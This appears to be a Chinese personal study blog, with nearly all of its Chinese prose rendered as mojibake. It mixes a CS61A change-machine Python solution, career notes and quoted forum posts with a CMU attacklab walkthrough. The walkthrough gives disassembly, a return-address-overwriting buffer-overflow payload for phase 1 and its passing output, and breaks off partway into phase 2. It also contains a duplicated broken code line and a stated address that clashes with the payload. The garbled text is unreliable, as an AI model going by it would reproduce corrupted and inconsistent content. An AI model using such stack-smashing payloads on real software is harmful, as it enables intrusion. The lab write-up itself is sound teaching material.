     - å¦‚æœè¿”å›å€¼`result`ä¸º`None`ï¼Œåˆ™è¯æ˜å‰©ä½™é‡‘é¢å·²ç»æ— æ³•è¢«å‰©ä½™ç¡¬å¸æ­£å¸¸å‡‘å‡ºï¼Œæ‰€ä»¥ç›´æ¥è¿”å›`make_change(amount, rest_conis)`ï¼Œè¿™æ ·å‡½æ•°è°ƒç”¨çš„æ—¶å€™ä¼šç›´æ¥è¿”å›`None`
       - å¦‚æœè¿”å›å€¼`result`ä¸ä¸º`None`ï¼Œé‚£ä¹ˆè¯æ˜å‰©ä½™é‡‘é¢å¯ä»¥è¢«å‰©ä½™ç¡¬å¸æ­£å¸¸å‡‘å‡ºï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªç¡¬å¸é¢é¢åˆ—è¡¨ï¼Œæ­¤æ—¶ç›´æ¥è¿”å›`[smallest]+result`

   > è¿™é‡Œçš„walkthroughåˆ†æçš„å¾ˆåˆ°ä½ï¼š
   >
   > The code for `make_change(amount, coins)` should do the following:
   >
   > 1. Check if `amount == smallest`, in which case return a one-element list containing just `smallest`.
   > 2. Otherwise, call `make_change(amount-smallest, rest)`, which returns either `None` or a list of numbers.
   > 3. If the call in Step 2 returned a list, then return a longer list that includes `smallest` at the front.
   > 4. If the call in Step 2 returned `None`, then there's no way to use the `smallest` coin, so just `make_change(amount, rest)`

åˆšæ‰è·Ÿå¥³æœ‹å‹äº¤æµäº†ä¸€ä¼šç—…æƒ…ï¼Œæ„Ÿè§‰å¾ˆå¥½ï¼Œå¾ˆå–œæ¬¢ğŸ˜‹

> ## Q4: Change Machine
>
> Complete the `change` method of the `ChangeMachine` class. A `ChangeMachine` instance holds some `coins`, which are initially all pennies. The `change` method takes a positive integer `coin`, adds that coin to its `coins`, and then returns a list that sums to `coin`. The machine prefers to return as many of the smallest coins available, ordered from smallest to largest. The coins returned by `change` are removed from the machine's `coins`.

q4é‡Œé¢å…³äºæ–¹æ³•`change`çš„æè¿°æœ‰é—®é¢˜ã€‚è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶å’Œä¸º`coin`çš„æ—¶å€™ï¼ŒåŒæ—¶å°†è¿™ä¸ªè¿”å›å€¼åˆ—è¡¨ä»`coin`ä¸­åˆ é™¤äº†ã€‚è€Œè¿™é‡Œåªæ˜¯è¯´è¿”å›å€¼ç¬¦åˆå’Œå€¼ä¸º`coin`ï¼Œåƒæ˜¯ä¸æƒ³å‘Šè¯‰å¤§å®¶ä¼¼å¾—ï¼Œåœ¨åé¢å·å·è¡¥å……äº†ä¸‹è¿™ä¸ªè¿”å›å€¼ä¼šè¢«åˆ é™¤ã€‚

å¦‚æœæƒ³è€ƒéªŒé˜…è¯»ç†è§£èƒ½åŠ›çš„è¯ï¼Œé‚£å½“æˆ‘æ²¡è¯è¯´ã€‚

é‚£ä¹ˆåˆ†æä¸‹å‡½æ•°`def change(self, coin)`ï¼š

- è¾“å…¥coinåï¼Œåœ¨æ­¤å®ä¾‹çš„å±æ€§`coins`çš„ä¸­æ·»åŠ æ­¤coinä¸€ä¸ª
- æŸ¥çœ‹`coins`ä¸­æ˜¯å¦èƒ½ç”¨æ¯”æ­¤`coin`å°çš„é¢é¢ç¡¬å¸ï¼ŒåŠ èµ·æ¥æ›¿æ¢æ‰è¿™ä¸ª`coin`
  - å¦‚æœå­˜åœ¨ï¼Œåˆ™åˆ é™¤è¿™äº›å°çš„ç¡¬å¸
  - å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ é™¤åˆšåŠ å…¥çš„`coin`

å…·ä½“å®ç°ï¼š

```py
def change(self, coin):
    """Return change for coin, removing the result from self.coins."""
    "*** YOUR CODE HERE ***"
    # å¦‚æœèƒ½æ›¿æ¢ï¼Œåˆ™åˆ é™¤resultï¼Œæ·»åŠ coinï¼›å¦‚æœä¸èƒ½ï¼Œç›´æ¥è¿”å›[coin]
    result = make_change(coin, self.coins)
    if result:
        dic_delete_list(self.coins, result)
        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨é”® coinï¼Œå¦‚æœä¸å­˜åœ¨åˆ™æ’å…¥å¹¶è®¾ç½®å€¼ä¸º 1ï¼Œå¦‚æœå­˜åœ¨åˆ™å°†å€¼è‡ªå¢ 1
        self.coins[coin] = self.coins.setdefault(coin, 0) + 1
    else:
        result = [coin]
    return result
```

ç”¨åˆ°çš„å‡ ä¸ªæ–¹æ³•ï¼š

1. `dic_delete_list(main_dict, list)`åˆ é™¤å­—å…¸ä¸­å¯¹åº”åˆ—è¡¨çš„å…ƒç´ ï¼š

   ä½¿ç”¨ `collections.Counter` å¯¹è±¡ï¼Œå®ƒæ˜¯ Python æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªè®¡æ•°å™¨å·¥å…·ï¼Œä¸“é—¨ç”¨äºç»Ÿè®¡å¯è¿­ä»£å¯¹è±¡ä¸­å…ƒç´ çš„å‡ºç°æ¬¡æ•°ï¼Œå¹¶ä»¥å­—å…¸çš„å½¢å¼è¿”å›ç»“æœã€‚

   ```py
   >>> from collections import Counter 
   >>> Counter(lio) 
   Counter({1: 3, 2: 2})
   >>> dict(Counter(lio)) 
   {1: 3, 2: 2}
   ```

   ```py
   def dic_delete_list(main_dict, list):
       # å°†è¦åˆ é™¤çš„åˆ—è¡¨è½¬ä¸ºå­—å…¸
       sub_dict = dict(Counter(list))
       # è®¡ç®—å‡å»å­å­—å…¸åçš„å€¼
       for key in sub_dict:
           if key in main_dict:
               if main_dict[key] > sub_dict[key]:
                   main_dict[key] -= sub_dict[key]
               else:
                   del main_dict[key]
   ```

2. `setdefault(key, default)` æ–¹æ³•ä¼šæ£€æŸ¥å­—å…¸ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”® `key`ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›å¯¹åº”çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å°† `key` æ’å…¥å­—å…¸å¹¶è®¾ç½®é»˜è®¤å€¼ `default`ã€‚

ä¸€ç›´ä»¥æ¥éƒ½å°†githubä½œä¸ºä»£ç å­˜æ”¾ç®¡ç†å¹³å°ï¼Œä»Šå¤©ä¸‹åˆå­¦ä¹ ä¸‹githubæ€ä¹ˆé«˜æ•ˆåˆ©ç”¨ï¼š

- æ‰¾æƒ³è¦äº†è§£çš„ä¼˜è´¨å¼€æºé¡¹ç›®ï¼ˆè·Ÿè‡ªå·±å­¦ä¹ æœ‰å…³çš„ï¼Œç„¶åä¼˜è´¨çš„ï¼‰
- folkå¹¶ä¸”æäº¤ä»£ç è¿›è¡Œåˆå¹¶

æˆ‘æƒ³ä»Šå¹´è½¬C++ï¼Œå¹¶ä¸”åœ¨å—äº¬é™„è¿‘èƒ½å¤Ÿæœˆå…¥2wã€‚

ç„¶åå°±æ˜¯è‡ªå·±çš„C++æ–¹å‘è·¯çº¿çš„åªè¨€ç‰‡è¯­ï¼š

> è´´å§ç”¨æˆ·_71yDAeyï¼š C++è¿™æ¡è·¯ï¼Œå¯ä¸èƒ½åªä¼šC++ï¼Œè¦çš„æ˜¯æ•´ä¸ªè®¡ç®—æœºä½“ç³»ï¼Œå°¤å…¶æ˜¯ç½‘ç»œ
>
> [æˆ‘ä»–å¦ˆå–åçœŸéš¾](http://c.tieba.baidu.com/home/main?id=tb.1.17156a27.vkUnmtW4-TVvJA2FRjQwtw&ie=utf-8&fr=pb): è€å“¥ä¸æ€¥æœ‰æˆ‘ï¼Œéƒ¨é—¨ç»„é•¿å«æˆ‘ä¸‰å¤©çœ‹å®Œæ–‡æ¡£ï¼Œè¿™å‘¨è·‘é€šä¸€ä¸ªæ™ºèƒ½è½¦ä»£ç ã€‚ç¦»è°±çš„æ˜¯æ¯”æˆ‘å…ˆè¿›æ¥ä¸€ä¸ªæœˆçš„ä¸€ä¸ªäººç»„é•¿å«ä»–ä¸€å‘¨çœ‹å®Œå‰ä¸‰ç« æ–‡æ¡£ï¼Œè€Œæˆ‘3å¤©çœ‹å®Œå‰äº”ç« æ–‡æ¡£ï¼Œä¸è¯´äº†ï¼Œè¿™å‡ å¤©ä»£ç å·²ç»çœ‹å¾—æˆ‘å¤´çš®å‘éº»äº†
>
> å£¹ç‚¹ç‚¹æ»´æ»´ï¼šä¸‰é¢˜ä¸€é¢˜éƒ½æ²¡å†™å‡ºæ¥ å› ä¸ºæˆ‘å¿˜äº†stlæ“ä½œçš„ç›¸åº”å‡½æ•°åªè®°å¾—åº•å±‚åŸç† ä¸‹åˆçš„é¢è¯•c++é—®é¢˜éƒ½ä¼š ä½†æ˜¯ä»–åé¢é—®äº†å‡ ä¸ªmysqlçš„é—®é¢˜ æˆ‘å°±ä¼šç´¢å¼• å…¶ä»–éƒ½æ²¡æœ‰ç­”ä¸Šæ¥ è¿˜æœ‰httpæˆ‘ä¹Ÿä¸ä¼š
>
> æœŸå¾…ï¼šä»Šå¤©å»ä½“æ£€äº† ç„¶åå¼„ä¸€ä¸‹ç¦»èŒè¯æ˜ å‘¨ä¸€å…¥èŒå’¯ å¸Œæœ›ä¸€åˆ‡é¡ºåˆ© ç°åœ¨å®Œæˆç¬¬ä¸€ä¸ªç›®æ ‡ æ‰¾åˆ°æœˆè–ªè¿‡ä¸‡çš„å·¥ä½œ æˆ‘çš„ä¸‹ä¸€ä¸ªç›®æ ‡æ˜¯ ä¸¤å¹´å†…æœˆè–ªè¶…è¿‡2w
>
> å…³äºæ·±å…¥å­¦ä¹ ï¼šç»è¿‡ä¸Šæ¬¡è¢«è£ æˆ‘æœ‰äº†ä¸€äº›å±æœºæ„Ÿ ä¹‹å‰æˆ‘è¿˜è§‰å¾—æˆ‘èƒ½åœ¨å…¬å¸å¾…å¾ˆä¹… è¿˜åœ¨è€ƒè™‘è€ƒç ”æˆ–è€…æ·±å…¥å­¦ä¹ æŠ€æœ¯ ç„¶åå»çœ‹äº†è®¡ç®—æœºç½‘ç»œè‡ªé¡¶å‘ä¸‹è¿™ç§åŸç†ä¹¦ å¯¼è‡´æˆ‘åœ¨åº”ç”¨ä¸Šæ²¡æœ‰å¤šå¤§è¿›æ­¥ æˆ‘è§‰å¾—è¿˜æ˜¯è¦æœ‰ä¸€äº›å±æœºæ„Ÿçš„ è¯´å®è¯ ç°åœ¨è¿™å®¶å…¬å¸æˆ‘éƒ½ä¸çŸ¥é“èƒ½å¾…å¤šä¹… è¯´ä¸å®šè¯•ç”¨æœŸéƒ½æœªå¿…èƒ½è¿‡ æˆ‘ç°åœ¨è§‰å¾—è¿˜æ˜¯å…ˆå­¦ä¸€äº›å®ç”¨æŠ€æœ¯ ä»¥åæœ‰æ—¶é—´æ·±å…¥å­¦ä¹ åŸç†å§
>
> ç°åœ¨åŠ ç­æœ‰ç‚¹çŒ› å·²ç»è¾¾åˆ°996çš„å¼ºåº¦äº† å°±æ²¡ä»€ä¹ˆæ—¶é—´å­¦ä¹  ä¸è¿‡æˆ‘è§‰å¾—æˆ‘è¿˜æ˜¯è¦å°½å¯èƒ½æŠ½å‡ºæ—¶é—´å­¦ä¹  å› ä¸ºä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å°±è¢«è£äº† ä»ä¸Šä¸€æ¬¡è¢«è£å æˆ‘è§‰å¾—æˆ‘ä»¬è¿˜æ˜¯è¦æœ‰å±æœºæ„Ÿ æå‡è‡ªå·± ä¸è¦æŠŠå¸Œæœ›å…¨å¯„æ‰˜åœ¨å…¬å¸ æŒ‡ä¸å®šå“ªå¤©å…¬å¸å°±æŠŠä½ è£äº†
>
> å…³äºç§Ÿæˆ¿ï¼šæ¢äº†ä¸ªåœ°æ–¹ç§Ÿæˆ¿ä½ åœ¨å…¬å¸é™„è¿‘ ç§Ÿæˆ¿è´¹ç”¨æ¶¨äº†ä¸€åƒ ç°åœ¨ä¸¤åƒå…«ä¸€ä¸ªæœˆäº† ä½†æ˜¯è·ç¦»å…¬å¸è·¯ç¨‹1åˆ†é’Ÿ å¾ˆè¿‘å¾ˆè¿‘ ä¹‹å‰ä½çš„åœ°æ–¹ä¸Šä¸‹ç­æ€»å…±è¦èŠ±è´¹ä¸¤ä¸ªåŠå°æ—¶ ä¸€ä¸ªæœˆå°±è¦èŠ±è´¹äº”åå¤šä¸ªå°æ—¶åœ¨è·¯ä¸Š æˆ‘ä¸å¤ªèƒ½æ¥å— è¿™æ—¶é—´ç”¨æ¥å­¦ä¹ å¤šå¥½å•Š è™½ç„¶æˆ‘ç°åœ¨ç»æµå‹åŠ›å¾ˆå¤§ ä½†æ˜¯æˆ‘ä¾æ—§è¦æŠŠæ—¶é—´èŠ±åœ¨å­¦ä¹ ä¸Š è€Œä¸æ˜¯ä¸Šä¸‹ç­é€šå‹¤ é’æ˜¥æ— ä»· ç¨‹åºå‘˜èŒä¸šç”Ÿæ¶¯æ˜¯çŸ­æš‚çš„ æˆ‘è¦å¤šèŠ±æ—¶é—´å­¦ä¹ 
>
> å…³äºå›°éš¾ï¼š
>
> é—®äº†ä¸€äº›äºº è¿˜æœ‰ä¸€äº›upä¸» éƒ½ä¸å»ºè®®æˆ‘èµ°éŸ³è§†é¢‘ å› ä¸ºä¸“å‡æœ¬åœ¨éŸ³è§†é¢‘é¢†åŸŸå¾ˆéš¾æ‰¾åˆ°å·¥ä½œ éŸ³è§†é¢‘å¯¹å­¦å†æœ‰è¦æ±‚ éƒ½å»ºè®®æˆ‘åšqt/MFCè¿™ç±»å®¢æˆ·ç«¯ æ¯”è¾ƒå¥½æ‰¾å·¥ä½œ ä½†æ˜¯æˆ‘ç°åœ¨å°±æ˜¯åšå®¢æˆ·ç«¯ æˆ‘æ„Ÿè§‰å®¢æˆ·ç«¯æ²¡ä»€ä¹ˆéš¾åº¦ å¤©èŠ±æ¿ä¹Ÿæ¯”è¾ƒä½ é—®åˆ«äººå…¶å®æˆ‘åªæ˜¯æƒ³é—®é—®éŸ³è§†é¢‘å¯¹äºå­¦å†è¦æ±‚é«˜ä¸é«˜ å¹¶ä¸ä¼šå½±å“æˆ‘èµ°éŸ³è§†é¢‘é“è·¯ å³ä½¿è¿™æ¡è·¯å¾ˆéš¾ å³ä½¿å­¦å†ä¸å¤Ÿ æˆ‘ä¾æ—§è¦èµ°è¿™æ¡è·¯ ä¸‹æ¬¡è·³æ§½ ä¸€å®šå»éŸ³è§†é¢‘å²—ä½ ä¸ä¸ºåˆ«çš„ å°±å–œæ¬¢æœ‰éš¾åº¦æœ‰å‰æ™¯çš„å²—ä½
>
> éšä¾¿è¿™å®¶å…¬å¸å¾ˆç´¯ æ¯”ä¹‹å‰ç´¯å¾ˆå¤š ä½†æ˜¯ä¸å¾—ä¸è¯´ ä¸ªäººæå‡å¾ˆå¿« æˆ‘ç°åœ¨å†™çš„ä»£ç æ¯”ä¹‹å‰å¥½å¤ªå¤šäº† è€Œä¸”ä¸ä»…ä»…æ˜¯ä»£ç æ°´å¹³æœ‰æå‡ å…¶ä»–æ–¹é¢ä¹Ÿæœ‰å¾ˆå¤§æå‡ æˆ‘éƒ½æ„Ÿè§‰æˆ‘ä¹‹å‰è¢«è£æ˜¯ä¸€ç§å¹¸è¿ åœ¨ä¹‹å‰å…¬å¸æˆ‘æ²¡æœ‰ä»€ä¹ˆæå‡
>
> è´´å§ç”¨æˆ·_7NMQVU1ï¼šåŠ æ²¹æ¥¼ä¸»ï¼Œè®°å¾—å½“æ—¶ä½ åˆšè½¬ç åŸ¹è®­æ›´æ–°è¿™ä¸ªç³»åˆ—çš„æ—¶å€™ä¹Ÿæœ‰å¾ˆå¤šäººåŠé€€ä½ ï¼Œä½ è¿˜æ˜¯åšæŒä¸‹äº†ï¼Œè¿˜åšçš„å¾ˆå¥½ï¼Œä½ çš„åˆ†äº«ä¹Ÿé¼“åŠ±åˆ°äº†ä¸å°‘äººï¼Œè§‰å¾—æ¥¼ä¸»æ˜¯ä¸ªå¾ˆæœ‰å†³å¿ƒæ‰§è¡ŒåŠ›å¾ˆå¼ºçš„äººï¼Œå¸Œæœ›æ¥¼ä¸»èƒ½åœ†æ¢¦
>
> è´´å§ç”¨æˆ·_aJAVyVyï¼šå»å¹´11æœˆå·¥ä½œæ—¶å€™åˆ·è´´å§å°±çœ‹åˆ°äº†æ¥¼ä¸»å¸–å­ï¼Œæˆ‘å½“æ—¶å’Œæ¥¼ä¸»ä¸€æ ·ä¹Ÿæ˜¯åˆšå…¥èŒå¾…è½¬æ­£ï¼Œä¸è¿‡æˆ‘æ˜¯c#ï¼Œä¸Šä½æœºã€‚
> å»å¹´æˆ‘ç‰¹è¾›è‹¦å°±å‡†å¤‡è·³æ§½ï¼Œå¦‚ä»Šæ¸…é—²ä¸‹æ¥æ¯å¤©æ‘¸é±¼æ··ç»éªŒã€‚æ—¶éš”4ä¸ªæœˆå†åˆ·åˆ°æ¥¼ä¸»çš„ç»­å¸–ï¼Œæœ‰ç§ç…§é•œå­çš„æ„Ÿè§‰ï¼Œæ¥¼ä¸»è¿™æ‰æ˜¯ç¨‹åºçŒ¿çš„ç²¾ç¥ï¼Œä¿æŒå±æœºæ„Ÿï¼Œæ—¶åˆ»è§‚å¯Ÿå¸‚åœºï¼Œæ—¶åˆ»å­¦ä¹ æŠ€æœ¯ã€‚ æˆ‘ä¹Ÿç«‹ä¸ªflagï¼Œä»Šå¹´è·³æ§½åˆ°å—äº¬çš„c++å¼€å‘å²—
>
> å…³äºèƒ–çŒ«ï¼šæˆ‘ä¸æ¥ï¼šæˆ‘æ˜¯æ²¡æœ‰ä¸€ä¸åŒæƒ…çš„ï¼Œå”¯ä¸€çš„åŒæƒ…çš„æƒ…æ„Ÿå°±æ˜¯åŒæƒ…ä»–è´«ç˜ çš„ç²¾ç¥ä¸–ç•Œï¼Œæˆ–è€…è¯´ä»–æŠŠè¿™ä¸ªå¥³ç”Ÿä½œä¸ºè‡ªå·±çš„ç²¾ç¥æ”¯æŸ±ã€‚è€å“¥çš„è½¬è¡Œä¹‹è·¯å¤ªåŠ±å¿—äº†ï¼ŒåŠ æ²¹

æ¥¼ä¸»å¾ˆçŒ›ï¼Œèƒ½ä¸€å¤©10h+çš„å­¦ä¹ ï¼Œå¿ƒæ— æ—éª›çš„è¯å¾ˆå‰å®³ã€‚ä½†æ˜¯ä¹Ÿæœ‰ç‚¹æ€¥åŠŸè¿‘åˆ©ï¼Œå¤ªç€æ€¥åè€Œé™ä¸ä¸‹å¿ƒå»è§£å†³çœŸæ­£çš„é—®é¢˜ã€‚

åšå®¢å›­é»˜è®¤æ¨¡å¼çœŸçš„ä¸‘å•Šï¼Œæƒ³å­¦ä¹ ä¸‹å¦‚ä½•æ”¹å–„åšå®¢å›­å…³äºè‡ªå·±çš„åšå®¢ç•Œé¢é€»è¾‘ã€‚

okï¼Œä»Šæ™šæµ…å°ä¸‹attacklabå¸¦æ¥çš„å¿«æ„Ÿã€‚

# attacklab

### phase1

ç›®æ ‡ï¼šæƒ³å®ç°ä»`test()`å‡½æ•°åŠ«æŒ`getbuf()`çš„è¿”å›åœ°å€ï¼Œä½¿å¾—è°ƒç”¨getbufè·å–è¾“å…¥åï¼Œç›´æ¥è·³è½¬åˆ°ç›®æ ‡åœ°å€æ‰§è¡Œ`touch1()`ã€‚

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
    Getbuf returned 0x%x\n", val);
 }
```

åŠ«æŒåçš„å‡½æ•°`touch1()`ï¼š

```c
1 void touch1()
2 {
3   vlevel = 1;/* Part of validation protocol */
4   printf("Touch1!: You called touch1()\n");
5   validate(1);
6   exit(0);
7 }
```

Your task is to get `CTARGET` to execute the code for `touch1` when `getbuf` executes its return statement,rather than returning to test.

åˆ†ætestçš„æ±‡ç¼–ä»£ç ï¼š

è¿™é‡Œå¯ä»¥ç”¨ç”¨`objdump -d ctarget > ctarget_raw.txt`äº§ç”Ÿæ±‡ç¼–ä»£ç è§‚å¯Ÿgetbufçš„è¡Œä¸ºï¼Œä»è€Œä¸ç”¨é€šè¿‡gdbåŠ¨æ€è°ƒè¯•æ¥çœ‹åæ±‡ç¼–çš„å‡½æ•°ä»£ç äº†ã€‚

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    call   0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    ret
End of assembler dump.
```

åœ¨`<+9>:     call   0x4017a8 <getbuf>`ï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯è°ƒç”¨getbufçš„æ—¶å€™ï¼Œè¾“å…¥è¶…é•¿å­—ç¬¦ä¸²ï¼Œå¯¼è‡´è°ƒç”¨getbufä¹‹å‰ä¿å­˜çš„è¿”å›åœ°å€æ›¿æ¢ä¸ºtouch1çš„åœ°å€ã€‚è¿™æ ·è®©getbufè°ƒç”¨retæŒ‡ä»¤æ—¶å€™ï¼Œä¼šå°†æ›¿æ¢åçš„åœ°å€ä½œä¸º program counterï¼ˆ%ripï¼‰çš„å€¼ï¼Œä»è€Œå®ç°æ§åˆ¶è½¬ç§»ã€‚è€Œtouch1çš„åœ°å€ä¸ºï¼š0x4017c0

**ç¡®è®¤è¶…é•¿å­—ç¬¦ä¸²çš„å†…å®¹ï¼š**

å› ä¸ºè¿”å›åœ°å€ä¿å­˜åœ¨getbufå¼€è¾Ÿçš„åœ°å€ä¹‹ä¸Šï¼Œå°±éœ€è¦çœ‹ä¸‹å‡½æ•°getbufå¼€è¾Ÿäº†å¤šå°‘ç©ºé—´ï¼š

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

å¯ä»¥çœ‹å‡ºgetbufå¼€è¾Ÿäº†0x28ï¼ˆhexï¼‰ = 40ï¼ˆdecï¼‰å­—èŠ‚ç©ºé—´ï¼Œæ‰€ä»¥å¯ä»¥æ¨æ–­å‡ºåªè¦å†™40ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå°±å¯ä»¥è¦†ç›–getbufå¼€è¾Ÿçš„æ ˆç©ºé—´ï¼Œå¹¶ä¸”å°†41ä¸ªå­—èŠ‚ä¿å­˜touch1çš„åœ°å€ï¼ˆ64ä½æ•°æ®void*ï¼‰ï¼Œå³å¯å®ç°level1çš„è¦æ±‚ã€‚

æŒ‰ç…§8ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œéœ€è¦5ä¸ªå•ä½çš„è¦†ç›–å€¼ï¼Œå¹¶ä¸”åŠ ä¸€ä¸ªå•ä½çš„0x4017a8è¿”å›åœ°å€ã€‚è¿™é‡Œåˆ©ç”¨è‡ªå¸¦çš„HEX2RAWç¨‹åºæ¥æ‰§è¡Œã€‚

exploit.txtæ–‡ä»¶å†…å®¹ï¼š

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```bash
unix> ./hex2raw < exploit.txt > exploit-raw.txt
unix> ./ctarget -q -i exploit-raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨ï¼š

```
unix> cat exploit.txt | ./hex2raw | ./ctarget
```

å°±ä¼šæŠ¥é”™ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿchatgptç»™çš„ç­”æ¡ˆæ˜¯ï¼š

> ç¬¬ä¸€ç§æ–¹æ³•ï¼ˆ`cat exploit.txt | ./hex2raw | ./ctarget`ï¼‰å‡ºé”™çš„å¯èƒ½åŸå› ä¸è¾“å…¥çš„å¤„ç†æ–¹å¼æˆ–ç¨‹åºå¤„ç†è¾“å…¥é‡å®šå‘å’Œç®¡é“çš„æ–¹å¼æœ‰å…³ã€‚é€šè¿‡å°†è¾“å…¥é¢„å…ˆè½¬æ¢ä¸ºåŸå§‹æ ¼å¼ï¼ˆ`exploit-raw.txt`ï¼‰ï¼Œä½ å¯ä»¥é¿å¼€ä¸ç®¡é“ç›¸å…³çš„æ½œåœ¨é—®é¢˜ã€‚

ç®¡é“ï¼Ÿç®—äº†ï¼Œä¸æ˜¯ç ”ç©¶é‡ç‚¹ï¼Œå…ˆæ”¾ä¸€ä¸‹ï¼ŒäºŒå‘¨ç›®å†æ¥ã€‚

## 5.11ï¼ˆdeleteï¼‰

### phase2

> Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.

ä»»åŠ¡æè¿°ï¼šè®©`CTARGET `æ‰§è¡Œ`touch2`è€Œä¸æ˜¯é‡æ–°æ‰§è¡Œ`test`ï¼Œè€Œä¸”`touch2`çš„å…¥å‚æ˜¯è‡ªå·±çš„cookieã€‚

æ€è·¯ï¼š

- åŠ«æŒæ‰§è¡Œåœ°å€æˆ‘ç†Ÿæ‚‰ï¼ŒåŒlevel1ï¼Œå°†testè°ƒç”¨getbufä¹‹å‰ä¿å­˜çš„è¿”å›åœ°å€ï¼Œç”±getbufçš„ä¸‹ä¸€è¡ŒæŒ‡ä»¤åœ°å€æ”¹ä¸ºtouch2çš„åˆå§‹åœ°å€ã€‚
- å…¥å‚ï¼Œæ€ä¹ˆæ‰èƒ½è®©touch2çš„å…¥å‚ï¼ˆ`%rdi`ï¼‰èµ‹å€¼ä¸ºè‡ªå·±çš„cookieå‘¢ï¼Ÿ

è¿™é‡Œä½œè€…ç®€å•ä»‹ç»äº†ä¸‹å¤§ä½“å®ç°æ€è·¯ï¼š

> Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.

å®ç°æ€è·¯ï¼šé¦–å…ˆå°†cookie -> rdiï¼Œç„¶åè°ƒç”¨retã€‚è¿™æ—¶æ ˆå›æ”¶ï¼Œå¹¶ä¸”å°†ä¿®æ”¹åä¸ºtouch2çš„åˆå§‹åœ°å€ä½œä¸ºæ‰§è¡Œåœ°å€ã€‚è¿™æ ·å‡ºç°çš„é—®é¢˜å°±æ˜¯ï¼Œå‡½æ•°è¿”å›åï¼Œrdiä¼šä¿å­˜çš„æ˜¯ä¹‹å‰cookieçš„å€¼å—ï¼Ÿè¿™å°±æ¶‰åŠåˆ°äº†è°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…å¯„å­˜å™¨çš„ä¿å­˜é—®é¢˜ï¼Œè¿™é‡Œæ¨¡ç³Šä¸æ¸…ï¼Œè¯æ˜å½“æ—¶æ²¡å­¦æ˜ç™½ã€‚

é‡æ–°å­¦ä¹ 3.7.5 Local Storage in Registers

è¿™é‡Œçš„callerä»£æŒ‡På‡½æ•°ï¼Œcalleeä»£æŒ‡På‡½æ•°ä¸­è°ƒç”¨çš„Qå‡½æ•°ã€‚

- callerä¸ºäº†ç¡®ä¿è°ƒç”¨å®Œcalleeåä¸å½±å“åç»­ä»£ç æ‰§è¡Œï¼Œ
- callee-registersï¼šç¡®ä¿Qï¼ˆcalleeï¼‰æ‰§è¡Œå®Œæ¯•åï¼Œè¿™äº›å¯„å­˜å™¨çš„å€¼ä¸ä¼šæ”¹å˜ã€‚ï¼ˆé‚£ä¸ºå•¥ä¸è®©callerç›´æ¥ä¿å­˜æ‰€æœ‰çš„å¯„å­˜å™¨å€¼ï¼Ÿ-å› ä¸ºè¿”å›å€¼è¿˜æ˜¯éœ€è¦Qæ”¹å˜çš„ï¼‰å…¸å‹çš„%rbx, %rbp, and %r12â€“%r15
- caller-registersï¼šå¯ä»¥è¢«ä»»æ„ä¿®æ”¹çš„å¯„å­˜å™¨ã€‚é™¤äº†%rbx, %rbp, and %r12â€“%r15å’Œ%rspï¼Œå…¶ä»–çš„å¯„å­˜å™¨ã€‚

æ€»ç»“çš„è¯å°±æ˜¯å‡½æ•°Qé™¤äº†%rbx, %rbp, and %r12â€“%r15çš„çŠ¶æ€ä¸èƒ½åŠ¨å¤–ï¼Œå…¶ä»–å¯„å­˜å™¨çŠ¶æ€éƒ½å¯ä»¥åŠ¨ã€‚

ç†è§£äº†è°ƒç”¨è€…å¯„å­˜å™¨å’Œè¢«è°ƒç”¨è€…å¯„å­˜å™¨åŒºåˆ«ï¼Œè¿™æ ·cookie -> rdiåï¼Œå³ä½¿å‡½æ•°æ§åˆ¶è¿”å›äº†ï¼Œå¯èƒ½ä¼šå¸¦ç€cookieçš„rdiæ¥è¿›å…¥touch2å‡½æ•°ã€‚

